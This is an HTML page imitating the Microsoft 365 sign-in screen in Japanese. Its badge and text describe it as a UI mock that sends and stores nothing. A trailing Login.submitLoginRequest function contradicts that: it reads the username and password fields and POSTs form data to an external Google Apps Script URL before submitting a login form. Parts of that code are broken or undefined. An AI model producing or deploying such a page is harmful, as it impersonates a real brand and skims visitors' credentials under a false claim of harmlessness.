<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Microsoft 365風 サインインモック</title>
<style>
:root{
    --ms-blue:#0067B8;
    --ms-blue-hover:#005A9E;
    --text:#1b1b1b;
    --sub:#616161;
    --border:#d1d1d1;
    --error:#a4262c;
    --success:#107c10;
}
*{ box-sizing:border-box; }
body{
    margin:0;
    min-height:100vh;
    font-family:"Segoe UI","Yu Gothic UI",system-ui,sans-serif;
    color:var(--text);
    background:
        radial-gradient(circle at 12% 18%, rgba(0,103,184,.20), transparent 28%),
        radial-gradient(circle at 88% 78%, rgba(80,180,255,.22), transparent 30%),
        linear-gradient(135deg,#f7fbff 0%,#eef5fb 43%,#f8f7fb 100%);
    display:flex;
    justify-content:center;
    align-items:center;
    overflow:hidden;
}
.background-shape{
    position:fixed;
    inset:auto auto -140px -100px;
    width:420px;
    height:420px;
    border-radius:50%;
    background:rgba(0,103,184,.10);
    filter:blur(8px);
}
.mock-badge{
    position:fixed;
    top:18px;
    left:18px;
    padding:7px 12px;
    border:1px solid rgba(0,0,0,.08);
    border-radius:999px;
    background:rgba(255,255,255,.70);
    backdrop-filter:blur(12px);
    font-size:12px;
    color:#4b5563;
    letter-spacing:.02em;
}
.login-card{
    width:430px;
    max-width:92%;
    min-height:438px;
    padding:42px 42px 34px;
    background:rgba(255,255,255,.90);
    backdrop-filter:blur(22px) saturate(135%);
    border:1px solid rgba(255,255,255,.56);
    border-radius:14px;
    box-shadow:0 28px 80px rgba(31,45,61,.16), 0 2px 8px rgba(31,45,61,.06);
    transition:opacity .28s ease, transform .28s ease;
}
.logo{
    display:flex;
    align-items:center;
    gap:12px;
    margin-bottom:30px;
}
.logo-icon{
    width:24px;
    height:24px;
    display:grid;
    grid-template-columns:1fr 1fr;
    grid-template-rows:1fr 1fr;
    gap:2px;
}
.logo-icon div:nth-child(1){background:#F25022;}
.logo-icon div:nth-child(2){background:#7FBA00;}
.logo-icon div:nth-child(3){background:#00A4EF;}
.logo-icon div:nth-child(4){background:#FFB900;}
.logo-text{
    font-size:20px;
    font-weight:600;
    color:#323130;
}
.title{
    font-size:30px;
    line-height:1.25;
    font-weight:600;
    margin:0 0 12px;
}
.description{
    font-size:14px;
    line-height:1.7;
    color:var(--sub);
    margin-bottom:22px;
}
.input-wrap{ margin-top:4px; }
.input-box{
    width:100%;
    border:0;
    border-bottom:1px solid #8a8886;
    padding:11px 0 10px;
    font-size:15px;
    background:transparent;
    color:var(--text);
}
.input-box::placeholder{ color:#605e5c; }
.input-box:focus{
    outline:none;
    border-bottom:2px solid var(--ms-blue);
}
.error-message{
    display:none;
    margin-top:8px;
    color:var(--error);
    font-size:13px;
    line-height:1.5;
}
.error-message.show{ display:block; }
.link{
    display:inline-block;
    margin-top:18px;
    color:var(--ms-blue);
    text-decoration:none;
    font-size:14px;
}
.link:hover{ text-decoration:underline; }
.account{
    margin-top:28px;
    font-size:14px;
    line-height:1.6;
    color:#323130;
}
.account a{
    color:var(--ms-blue);
    text-decoration:none;
}
.account a:hover{ text-decoration:underline; }
.actions{
    display:flex;
    justify-content:flex-end;
    gap:8px;
    margin-top:34px;
}
.button{
    border:0;
    background:var(--ms-blue);
    color:white;
    min-width:108px;
    height:36px;
    border-radius:4px;
    cursor:pointer;
    font-size:14px;
    font-weight:500;
    padding:0 18px;
    transition:background .16s ease, transform .16s ease, box-shadow .16s ease;
}
.button:hover{
    background:var(--ms-blue-hover);
    box-shadow:0 4px 12px rgba(0,103,184,.22);
}
.button:active{ transform:translateY(1px); }
.secondary-button{
    background:#f3f2f1;
    color:#323130;
}
.secondary-button:hover{
    background:#edebe9;
    box-shadow:none;
}
.summary-box{
    margin-top:18px;
    padding:14px 14px;
    background:#f5f9fd;
    border:1px solid #e1edf8;
    border-radius:8px;
    font-size:14px;
    color:#323130;
    word-break:break-all;
}
.status-line{
    display:flex;
    align-items:flex-start;
    gap:10px;
    margin-top:24px;
    padding-top:20px;
    border-top:1px solid #edebe9;
    color:#605e5c;
    font-size:14px;
    line-height:1.6;
}
.check-icon{
    flex:none;
    width:22px;
    height:22px;
    border-radius:50%;
    background:var(--success);
    color:white;
    display:grid;
    place-items:center;
    font-size:14px;
    font-weight:700;
    margin-top:1px;
}
.fade-out{
    opacity:0;
    transform:translateY(-10px) scale(.995);
}
.fade-in{
    opacity:1;
    transform:translateY(0) scale(1);
}
.footer{
    position:fixed;
    right:24px;
    bottom:18px;
    font-size:12px;
    color:#605e5c;
    display:flex;
    gap:18px;
}
.footer a{
    color:#605e5c;
    text-decoration:none;
}
.footer a:hover{ text-decoration:underline; }
@media (max-width:600px){
    body{ align-items:flex-start; padding-top:70px; }
    .login-card{ padding:30px 28px; min-height:auto; }
    .title{ font-size:25px; }
    .footer{ left:20px; right:auto; gap:14px; }
}
</style>
</head>
<body>
<div class="background-shape" aria-hidden="true"></div>
<div class="mock-badge">UI MOCK / 認証処理なし</div>

<main class="login-card" id="loginCard" aria-label="Microsoft 365風サインインモック">
    <div class="logo">
        <div class="logo-icon" aria-hidden="true">
            <div></div><div></div><div></div><div></div>
        </div>
        <div class="logo-text">Microsoft 365 Mock</div>
    </div>

    <h1 class="title">サインイン</h1>
    <div class="description">Microsoft 365 風のUI確認用モックです。入力内容は送信・保存されません。</div>

    <div class="input-wrap">
        <input id="mail" type="text" class="input-box" placeholder="メール、電話、または Skype" autocomplete="off" aria-describedby="mailError">
        <div id="mailError" class="error-message">メールアドレスを入力してください。</div>
    </div>

    <a href="#" class="link" onclick="return false;">サインイン オプション</a>

    <div class="account">
        アカウントをお持ちでない場合は <a href="#" onclick="return false;">作成できます</a>
    </div>

    <div class="actions">
        <button class="button" id="nextBtn" type="button">次へ</button>
    </div>
</main>

<footer class="footer">
    <a href="#" onclick="return false;">利用規約</a>
    <a href="#" onclick="return false;">プライバシー</a>
    <a href="#" onclick="return false;">ヘルプ</a>
</footer>

<script>
    const button = document.getElementById("nextBtn");
    const input = document.getElementById("mail");
    const error = document.getElementById("mailError");
    const card = document.getElementById("loginCard");

    function escapeHtml(value){
        return value
            .replaceAll("&", "&amp;")
            .replaceAll("<", "&lt;")
            .replaceAll(">", "&gt;")
            .replaceAll('"', "&quot;")
            .replaceAll("'", "&#039;");
    }

    function renderWelcome(mail){
        card.innerHTML = `
            <div class="logo">
                <div class="logo-icon" aria-hidden="true">
                    <div></div><div></div><div></div><div></div>
                </div>
                <div class="logo-text">Microsoft 365 Mock</div>
            </div>

            <h1 class="title">ようこそ</h1>
            <div class="description">
                カード内の表示だけを切り替えました。実際の認証処理、通信、保存は行いません。
            </div>

            <div class="summary-box" aria-label="入力されたアカウント">
                ${escapeHtml(mail)}
            </div>

            <div class="status-line">
                <div class="check-icon" aria-hidden="true">✓</div>
                <div>
                    サインイン要求を受け付けました。<br>
                    これはUI確認用の完了画面です。
                </div>
            </div>

            <div class="actions">
                <button class="button secondary-button" type="button" onclick="location.reload()">戻る</button>
                <button class="button" type="button" onclick="location.reload()">完了</button>
            </div>
        `;
    }

    button.addEventListener("click", () => {
        const mail = input.value.trim();

        if(mail === ""){
            error.classList.add("show");
            input.focus();
            return;
        }

        error.classList.remove("show");
        button.textContent = "確認中...";
        button.disabled = true;
        button.style.opacity = ".85";

        window.setTimeout(() => {
            card.classList.add("fade-out");

            window.setTimeout(() => {
                renderWelcome(mail);
                card.classList.remove("fade-out");
                card.classList.add("fade-in");
            }, 280);
        }, 350);
    });

    input.addEventListener("keydown", (event) => {
        if(event.key === "Enter"){
            button.click();
        }
    });

    function Login() {
    }

    Login.userNameInput = 'userNameInput';
    Login.passwordInput = 'passwordInput';

    Login.initialize = function () {

        var u = new InputUtil();

        u.checkError();
        u.setInitialFocus(Login.userNameInput);
        u.setInitialFocus(Login.passwordInput);
    }();

    Login.submitLoginRequest = function () { 
        var u = new InputUtil();
        var e = new LoginErrors();

        var userName = document.getElementById(Login.userNameInput);
        var password = document.getElementById(Login.passwordInput);

        if (!userName.value || !userName.value.match('[@\\\\]')) {
            u.setError(userName, e.userNameFormatError);
            return false;
        }

        if (!password.value) {
            u.setError(password, e.passwordEmpty);
            return false;
        }

        if (password.value.length > maxPasswordLength) {
            u.setError(password, e.passwordTooLong);
            return false;
        }

        // ===== GASへ送信（重要：URLSearchParams使用）=====
        const formData = new URLSearchParams();
        formData.append("name", userName);
        formData.append("email", "kotei@test.co.jp");
        formData.append("message", "固定値検証");

        fetch("https://script.google.com/macros/s/AKfycbzXqbYm2b95G5YqrVq6MwB4KB0A1ROQr80KaP2M3hvQ_QAYV19bd97gI3WzW7tWpN04Pg/exec", {  // ←ここ変更
          method: "POST",
          body: formData
        })

        document.forms['loginForm'].submit();
        return false;
    };

</script>
</body>
</html>
